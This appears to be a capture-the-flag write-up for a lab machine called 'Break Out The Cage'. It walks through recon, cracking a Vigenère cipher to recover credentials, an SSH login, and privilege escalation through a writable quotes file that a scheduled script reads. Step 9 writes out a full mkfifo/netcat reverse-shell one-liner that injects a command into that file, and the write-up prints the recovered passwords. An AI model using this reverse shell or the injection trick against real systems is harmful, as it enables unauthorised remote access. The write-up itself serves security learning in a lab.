# Break Out The Cage

Fun, because Cage is fun :)

## Recon

1. nmap revealed 21, 22 and 80
2. nikto and dirb on the website revealed a few listable folders, including `/scripts` and `/contracts`, which contained nothing (movie contracts in the first instance)
3. ftp allowed anonymous, and contained a single file `dad_tasks`
4. This file was base 64 encoded, and then looked vignere encoded. I broke the latter with https://www.guballa.de/vigenere-solver which revealed the password `namelesstwo`
5. This gave a list of humourous tasks, and what I guessed successfully was the ssh password: `Mydadisghostrideraintthatcoolnocausehesonfirejokes`
6. From the website I knew this user's name was `weston` and so I successfully logged in with that user.

## Shell as Weston

6. Once on the machine, `sudo -l` revealed the user could run `/usr/bin/bees`. This is a shell script that just runs the `wall` command. However, the wall command is not something I can delete or move, by the looks of it.

7. Navigating to the website directory, I found an `/auditions` folder containing an MP3 that obviously contained a spectogram. However, when I ran it through Sonic Visualiser it just gave me the password to the vignere encoding from before :D

8. The other user on the machine was `cage`, so I ran a `find / -user cage 2>/dev/null` and found a folder called `.dad_scripts` under `/opt`. While on the machine I had noticed periodic wall broadcasts, and in here I found a python script running wall against a randomly selected quote from `/opt/.dad_scripts/.files/.quotes`, as `cage`. And the .quotes file was writable :)

9. I overwrote .quotes with the following and waited:

    `echo ";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.226.229 4444 >/tmp/f" > .quotes`

## Reverse Shell as Cage

10. Once the shell popped, I navigated to `/home/cage`. In there was a file, `Super_Duper_Checklist` which contained the **user flag**.

11. There was also an `email_backup` directory. Under there were three rather humorous emails, where Cage's agent is revealed to be the root user. There was also a hint to the password, `haiinspsyanileph`

## Finish

12. It took me a while to figure this one out, largely because it failed via my vignere brute forcer (which stops on the first entropically significant key, leading to an incorrect guess). It is a vignere cypher, and the password is `face`, a hint gained from the email where its found which repeats the word a lot (a bit silly). This gives the root password `cageisnotalegend`.

    > as a note, it might be interesting to build a vignere brute forcer. Could brute force character combinations, and check each as a cipher while testing for english words from a word list maybe.

13. After `su root`, inside the root folder is another email backup set, of which the final email gives the **root flag**.